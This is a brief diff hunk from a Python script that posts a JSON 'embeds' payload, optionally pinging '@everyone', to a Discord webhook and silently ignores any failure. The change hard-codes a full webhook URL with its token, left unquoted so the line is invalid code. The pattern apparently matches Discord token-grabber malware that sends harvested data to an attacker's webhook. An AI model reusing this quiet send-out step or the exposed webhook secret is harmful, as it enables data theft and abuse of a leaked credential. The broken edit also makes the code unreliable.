@@ -40,7 +40,7 @@ def main():
     payload = json.dumps({"embeds": embeds, "content": "@everyone" if PING_ME else ""})
     
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        req = Request(https://discord.com/api/webhooks/960208136503980092/C-ikEoc53TLBq5UwxUotkuHivL3SJmo7NPp0cUHJGTWKwgIYxOMlY5OZ5X0FMh_KSHr9, data=payload.encode(), headers=headers)
         urlopen(req)
     except:
         pass
